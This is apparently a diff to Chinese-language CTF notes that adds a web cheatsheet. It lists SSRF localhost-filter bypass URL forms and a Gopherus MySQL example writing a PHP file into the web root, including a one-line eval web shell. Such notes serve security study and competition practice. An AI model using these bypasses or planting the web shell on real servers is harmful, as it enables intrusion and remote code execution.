@@ -46,6 +46,8 @@
 
 ### Web
 
+- localhost绕过：127.0.0.1  >>> 2130706433 https://www.browserling.com/tools/ip-to-dec
+
 ### Pwn
 
 - Pwntools：https://github.com/Gallopsled/pwntools
@@ -59,7 +61,41 @@
 - Ollydbg：https://www.ollydbg.de/
 - angr：二进制分析 https://github.com/angr/angr
 
-## CTF   命令速查
+## Cheatsheet
+
+### Web
+
+#### localhost绕过
+
+```
+http://127.0.0.1:80
+http://localhost:22
+http://[::]:80/  >>>  http://127.0.0.1
+http://example.com@127.0.0.1
+http://127.0.0.1.xip.io/
+http://127。0。0。1  >>>  http://127.0.0.1
+http://0/
+
+# 十六进制、八进制转换
+http://127.0.0.1  >>>  http://0177.0.0.1/
+
+# 转换为小数 https://www.browserling.com/tools/ip-to-dec
+http://127.0.0.1  >>>  http://2130706433/
+```
+
+#### Gopherus
+
+```
+# mysql
+> python2 gopherus.py --exploit mysql
+---------------------------------------------
+Give MySQL username: root
+Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/gopher.php"
+```
+
+```
+select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
+```
 
 ### Reverse
 
